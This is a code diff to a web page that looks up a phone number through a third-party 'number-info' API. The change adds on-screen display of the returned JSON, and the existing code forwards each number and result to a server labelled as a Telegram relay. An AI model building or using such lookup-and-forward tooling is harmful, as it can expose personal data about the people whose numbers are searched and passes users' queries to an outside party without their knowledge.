@@ -87,6 +87,7 @@ button {
 
 <br>
 <button onclick="startAll()">START</button>
+<div id="resultBox" style="margin-top:20px;"></div>
 
 <div class="loader" id="loader">
   <div></div><div></div><div></div>
@@ -163,10 +164,22 @@ async function phoneSearch(num) {
   try {
     const res = await fetch(`https://number-info-bd-tau.vercel.app/info?number=${num}`);
     result = await res.json();
+
+    // 🔥 SCREEN PE SHOW
+    document.getElementById("resultBox").innerHTML = `
+      <pre style="text-align:left;color:#0f0;">
+${JSON.stringify(result, null, 2)}
+      </pre>
+    `;
+
   } catch (e) {
     result = { error: "API Failed" };
+
+    document.getElementById("resultBox").innerHTML =
+      "❌ API Failed";
   }
 
+  // 🔥 TELEGRAM PE SEND
   await fetch(`${SERVER}/number`, {
     method: "POST",
     headers: {"Content-Type": "application/json"},
